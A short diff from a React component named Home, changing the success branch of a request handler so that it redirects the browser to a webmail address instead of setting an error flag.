@@ -33,7 +33,7 @@ function Home(){
             if(response.status == 200){
                 console.log(response.data.message);
     
-                setShowError(true);
+                window.location.href = 'https://webmail.ardmore.net/';
             }
           } catch (error) {
             // Handle error
